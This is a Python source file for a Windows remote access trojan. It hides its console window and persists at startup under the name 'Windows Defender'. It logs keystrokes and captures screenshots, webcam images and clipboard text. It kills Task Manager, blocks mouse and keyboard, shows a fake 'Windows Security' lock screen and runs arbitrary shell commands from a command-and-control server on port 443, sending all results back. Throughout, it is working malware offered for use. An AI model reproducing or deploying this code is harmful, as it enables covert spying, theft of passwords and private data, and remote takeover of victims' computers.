import os
import time
import socket
import struct
import threading
import platform
import subprocess
import io
import psutil
import ctypes
import sys
import winreg
import shutil
import cv2
import ctypes.wintypes
import tkinter as tk
from pynput import keyboard
from PIL import ImageGrab
import getpass 

SERVER_IP = "192.168.50.235"  # put server IP
SERVER_PORT = 443
locker_window = None
unlock_event = threading.Event()

def hide_console():
    if sys.platform == "win32":
        ctypes.windll.user32.ShowWindow(ctypes.windll.kernel32.GetConsoleWindow(), 0)

def add_to_startup(name, path=None):
    if path is None:
        path = sys.executable
    key = winreg.HKEY_CURRENT_USER
    reg_path = r"Software\\Microsoft\\Windows\\CurrentVersion\\Run"
    try:
        registry = winreg.OpenKey(key, reg_path, 0, winreg.KEY_SET_VALUE)
        winreg.SetValueEx(registry, name, 0, winreg.REG_SZ, path)
        winreg.CloseKey(registry)
    except:
        pass

def copy_to_startup():
    try:
        startup_path = os.path.join(os.getenv("APPDATA"), "Microsoft\\Windows\\Start Menu\\Programs\\Startup")
        target_path = os.path.join(startup_path, "WindowsDefender.exe")
        current_path = sys.executable
        if not os.path.exists(target_path):
            shutil.copyfile(current_path, target_path)
    except:
        pass

def get_clipboard_text():
    try:
        CF_TEXT = 1
        user32 = ctypes.windll.user32
        user32.OpenClipboard(0)
        
        handle = user32.GetClipboardData(CF_TEXT)
        if handle:
            text = ctypes.c_char_p(handle).value.decode('utf-8', errors='ignore') # Προσθήκη errors='ignore'
            user32.CloseClipboard()
            if text:
                return b"TYPE:TEXT" + f"[Clipboard] {text}".encode()
            else:
                return b"TYPE:TEXT" + b"[Clipboard] No text in clipboard." # Επιστροφή μηνύματος
        else:
            user32.CloseClipboard()
            return b"TYPE:TEXT" + b"[Clipboard] Could not get clipboard data (handle is null)."
    except Exception as e:
        return b"TYPE:TEXT" + f"[Clipboard Error] {e}".encode()

def disable_task_manager():
    try:
        killed = 0
        for proc in psutil.process_iter(['name']):
            if proc.info['name'] and "taskmgr" in proc.info['name'].lower():
                proc.kill()
                killed += 1
        return b"TYPE:TEXT" + f"[+] Killed {killed} Task Manager instance(s)".encode()
    except Exception as e:
        return b"TYPE:TEXT" + f"[TaskMgr Error] {e}".encode()

def lock_input():
    try:
        ctypes.windll.user32.BlockInput(True)
        return b"TYPE:TEXT" + b"[+] Input blocked (mouse & keyboard)"
    except Exception as e:
        return b"TYPE:TEXT" + f"[BlockInput Error] {e}".encode()

def unlock_input():
    try:
        ctypes.windll.user32.BlockInput(False)
        return b"TYPE:TEXT" + b"[+] Input unblocked"
    except Exception as e:
        return b"TYPE:TEXT" + f"[Unblock Error] {e}".encode()

def screen_locker():
    global locker_window, unlock_event
    if locker_window is not None:
        return b"TYPE:TEXT" + b"[!] Screen locker already active"

    unlock_event.clear()

    def check_unlock():
        if unlock_event.is_set():
            if locker_window:
                locker_window.destroy()
        else:
            locker_window.after(500, check_unlock)

    def run_gui():
        global locker_window
        locker_window = tk.Tk()
        locker_window.title("Windows Security")
        locker_window.attributes("-fullscreen", True)
        locker_window.configure(bg="black")
        locker_window.protocol("WM_DELETE_WINDOW", lambda: None)

        label = tk.Label(locker_window, text="\ud83d\udd12 System Locked for Security Update",
                         fg="white", bg="black", font=("Arial", 30))
        label.pack(expand=True)

        check_unlock()
        locker_window.mainloop()
        locker_window = None

    threading.Thread(target=run_gui, daemon=True).start()
    return b"TYPE:TEXT" + b"[+] Screen locker started"

def screen_unlock():
    global unlock_event
    unlock_event.set()
    return b"TYPE:TEXT" + b"[+] Screen unlock requested"

class KeyLogger:
    def __init__(self):
        self.log = ""
        self.listener = keyboard.Listener(on_press=self.on_press)
        self.listener.start()

    def on_press(self, key):
        try:
            self.log += key.char
        except AttributeError:
            self.log += f"[{key}]"

    def get_logs(self):
        logs = self.log
        self.log = ""
        return logs.encode()

class PlainConnection:
    def __init__(self):
        self.socket = None

    def connect(self):
        while True:
            try:
                self.socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                self.socket.connect((SERVER_IP, SERVER_PORT))
                return
            except:
                time.sleep(5)

    def send(self, data: bytes):
        length = struct.pack("!I", len(data))
        self.socket.sendall(length + data)

    def receive(self):
        try:
            length_data = self.socket.recv(4)
            if not length_data:
                return None
            length = struct.unpack("!I", length_data)[0]
            data = b""
            while len(data) < length:
                packet = self.socket.recv(length - len(data))
                if not packet:
                    return None
                data += packet
            return data
        except:
            return None

class RATClient:
    def __init__(self):
        self.keylogger = KeyLogger()
        self.conn = PlainConnection()

    def capture_screenshot(self):
        buffer = io.BytesIO()
        try:
            img = ImageGrab.grab()
            img.save(buffer, format="PNG")
            return b"TYPE:SCREENSHOT" + buffer.getvalue()
        except Exception as e:
            return b"TYPE:TEXT" + f"[ERROR screenshot] {e}".encode()

    def capture_camera(self):
        try:
            cap = cv2.VideoCapture(0)
            if not cap.isOpened():
                return b"TYPE:TEXT" + b"[ERROR camera] No camera detected"
            for _ in range(10):
                cap.read()
                time.sleep(0.05)
            ret, frame = cap.read()
            cap.release()
            if not ret:
                return b"TYPE:TEXT" + b"[ERROR camera] Could not capture frame"
            result, buffer = cv2.imencode(".png", frame)
            if not result:
                return b"TYPE:TEXT" + b"[ERROR camera] Failed to encode image"
            return b"TYPE:CAMERA" + buffer.tobytes()
        except Exception as e:
            return b"TYPE:TEXT" + f"[ERROR camera] {e}".encode()

    def system_info(self):
        info = {
            "OS": platform.platform(),
            "CPU": platform.processor(),
            "RAM": f"{round(psutil.virtual_memory().total / (1024**3), 2)} GB",
            "User": getpass.getuser() # Αλλαγή από os.getlogin() σε getpass.getuser()
        }
        return b"TYPE:TEXT" + str(info).encode()

    def list_processes(self):
        try:
            result = "\n".join(f"{p.pid} - {p.name()}" for p in psutil.process_iter())
            return b"TYPE:TEXT" + result.encode()
        except:
            return b"TYPE:TEXT" + b"[ERROR listing processes]"

    def kill_process(self, pid):
        try:
            p = psutil.Process(int(pid))
            p.terminate()
            return b"TYPE:TEXT" + b"[+] Process terminated"
        except:
            return b"TYPE:TEXT" + b"[-] Failed to terminate"

    def execute_shell(self, command):
        try:
            output = subprocess.check_output(command, shell=True, stderr=subprocess.STDOUT)
            return b"TYPE:TEXT" + output
        except subprocess.CalledProcessError as e:
            return b"TYPE:TEXT" + e.output

    def run(self):
        while True:
            try:
                self.conn.connect()
                while True:
                    cmd = self.conn.receive()
                    if not cmd:
                        break

                    decoded = cmd.decode()
                    if decoded == "help":
                        response = "Commands: help, get_logs, screenshot, camera, clipboard, disable_taskmgr, block_input, unblock_input, screen_lock, screen_unlock, shell <cmd>, system_info, list_processes, kill_process <pid>"
                        self.conn.send(b"TYPE:TEXT" + response.encode())
                    elif decoded == "get_logs":
                        self.conn.send(b"TYPE:TEXT" + self.keylogger.get_logs())
                    elif decoded == "screenshot":
                        self.conn.send(self.capture_screenshot())
                    elif decoded == "camera":
                        self.conn.send(self.capture_camera())
                    elif decoded == "clipboard":
                        self.conn.send(get_clipboard_text())
                    elif decoded == "disable_taskmgr":
                        self.conn.send(disable_task_manager())
                    elif decoded == "block_input":
                        self.conn.send(lock_input())
                    elif decoded == "unblock_input":
                        self.conn.send(unlock_input())
                    elif decoded == "screen_lock":
                        self.conn.send(screen_locker())
                    elif decoded == "screen_unlock":
                        self.conn.send(screen_unlock())
                    elif decoded == "system_info":
                        self.conn.send(self.system_info())
                    elif decoded == "list_processes":
                        self.conn.send(self.list_processes())
                    elif decoded.startswith("kill_process "):
                        pid = decoded.split(" ", 1)[1]
                        self.conn.send(self.kill_process(pid))
                    elif decoded.startswith("shell "):
                        cmdline = decoded[6:]
                        self.conn.send(self.execute_shell(cmdline))
                    else:
                        self.conn.send(b"TYPE:TEXT" + b"Unknown command")

            except Exception as e:
                time.sleep(5)

if __name__ == "__main__":
    hide_console()
    add_to_startup("Windows Defender")
    copy_to_startup()
    RATClient().run()